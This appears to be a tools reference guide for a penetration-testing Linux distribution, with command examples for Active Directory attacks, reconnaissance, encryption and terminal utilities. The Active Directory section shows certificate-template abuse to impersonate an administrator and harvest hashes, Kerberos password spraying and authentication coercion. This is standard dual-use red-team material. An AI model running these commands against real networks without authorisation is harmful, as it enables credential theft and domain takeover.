# 🜂 ZOTHOS Linux: Tools Reference & Operational Guide 🜄

This guide provides usage instructions, commands, and workflows for key pre-installed tools across Offensive Security, Active Directory, OPSEC, and Autonomous AI.

---

## 1. Active Directory & Enterprise Red Team

### Certipy (`certipy-ad`)
Active Directory Certificate Services (AD CS) enumeration and abuse.
```bash
# Enumerate all vulnerable certificate templates (ESC1 - ESC13)
certipy find -u 'user@domain.local' -p 'Password123!' -dc-ip 10.10.10.10 -vulnerable

# Request certificate abusing vulnerable template (ESC1)
certipy req -u 'user@domain.local' -p 'Password123!' -dc-ip 10.10.10.10 \
    -ca 'CORP-CA' -template 'VulnerableTemplate' -upn 'administrator@domain.local'

# Authenticate with retrieved PFX and harvest NT hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

### Kerbrute
Fast user enumeration and password spraying via Kerberos pre-authentication.
```bash
# Enumerate valid domain usernames without triggering account lockouts
kerbrute userenum --dc 10.10.10.10 -d domain.local /usr/share/seclists/Usernames/top-usernames-shortlist.txt

# Password spray a single password against valid usernames
kerbrute passwordspray --dc 10.10.10.10 -d domain.local valid_users.txt 'Winter2026!'
```

### Coercer
Automatically coerce Windows machines into authenticating back to your listener via 12+ RPC protocols.
```bash
# Coerce machine authentication (PetitPotam, ShadowCoerce, DFSCoerce, etc.)
coercer coerce -u 'user' -p 'password' -d 'domain.local' -l 10.10.10.5 -t 10.10.10.20
```

### PEASS-ng (linPEAS & winPEAS)
Automated local privilege escalation scripts.
```bash
# Run linPEAS on Linux target
linpeas

# Or inspect the packaged payload folder
ls -la /usr/share/peass/linpeas/
ls -la /usr/share/peass/winpeas/
```

---

## 2. Next-Gen Reconnaissance & Attack Surface

### ProjectDiscovery Pipeline: `subfinder` -> `httpx` -> `katana` -> `nuclei`
```bash
# Step 1: Passive subdomain discovery
subfinder -d target.com -o subdomains.txt

# Step 2: Probe active HTTP/HTTPS services, ports, and tech stacks
httpx -l subdomains.txt -title -tech-detect -status-code -o live_hosts.txt

# Step 3: Crawl endpoints and parameters
katana -list live_hosts.txt -jc -d 3 -o endpoints.txt

# Step 4: Vulnerability scanning with Nuclei templates
nuclei -l live_hosts.txt -severity critical,high -o vulnerabilities.txt
```

### TruffleHog
Deep secret and credential auditing with verified API validation.
```bash
# Scan a Git repository for leaked API keys, tokens, and private keys
trufflehog git file://./my-repo --only-verified

# Scan a local filesystem path
trufflehog filesystem /opt/ --only-verified
```

### GoWitness
Automated web screenshotting utility for rapid visual asset triage.
```bash
# Take automated screenshots of a list of web services
gowitness file -f live_hosts.txt --threads 4

# View the generated gallery in interactive web UI
gowitness server
```

---

## 3. Sovereign OPSEC & Cryptography

### age
Modern, secure, and lightweight file encryption.
```bash
# Generate a new keypair
age-keygen -o key.txt

# Encrypt a file using recipient public key
age -r age1ql3z7hjy54pw3hyww5ayyfg7zqgvc7w3j2elw8zmrj2kg5sfn9aqmcac8p secret.pdf > secret.pdf.age

# Decrypt using identity file
age -d -i key.txt secret.pdf.age > secret.pdf
```

### VeraCrypt
Plausibly deniable encrypted disk containers.
```bash
# Launch GUI
veracrypt

# Mount volume via CLI (text-only mode)
veracrypt -t -k "" --protect-hidden=no /media/secure.tc /mnt/secure
```

### KeePassXC
Encrypted password and credential storage.
```bash
# Launch GUI vault
keepassxc

# Query or search secrets via CLI
keepassxc-cli show /path/to/database.kdbx 'TargetEntry'
```

### OnionShare
Anonymous file sharing, private chat, and site hosting over Tor.
```bash
# Send files anonymously via Tor onion service
onionshare --chat
# Host an ephemeral onion site
onionshare /path/to/static-site --public
```

---

## 4. Modern Terminal & DevOps TUIs

### LazyDocker & LazyGit
```bash
# Manage Docker/Podman containers, logs, volumes, and networks
lazydocker

# Keyboard-driven Git management
lazygit
```

### Yazi File Navigator
```bash
# Async terminal file manager with inline image previews
yazi
```

### Doggo DNS Client
```bash
# Query DNS over HTTPS (DoH) with clean JSON output
doggo target.com @https://cloudflare-dns.com/dns-query
```

### Trippy (`trip`)
```bash
# Interactive real-time traceroute and ping diagnostics
trip target.com
```

---

## 5. Sovereign AI & Agentic Tooling

### NullAI HexStrike AI Terminal
Neural-assisted terminal with real-time MITRE ATT&CK guidance.
```bash
# Launch HexStrike
hexstrike
```

### Nous Research Hermes Agent
Autonomous AI agent with deep skill integration and terminal execution.
```bash
# Run Hermes
hermes
```

### Zoth Package Provisioner (`zoth-pkg`)
Manage and verify over 213+ curated tools across Debian, Kali, and Parrot repositories.
```bash
# List all verified tools and installation state
zoth-pkg list

# Audit all installed tools
zoth-pkg verify

# Install a specific tool or category
sudo zoth-pkg install <tool_id|category|all>
```
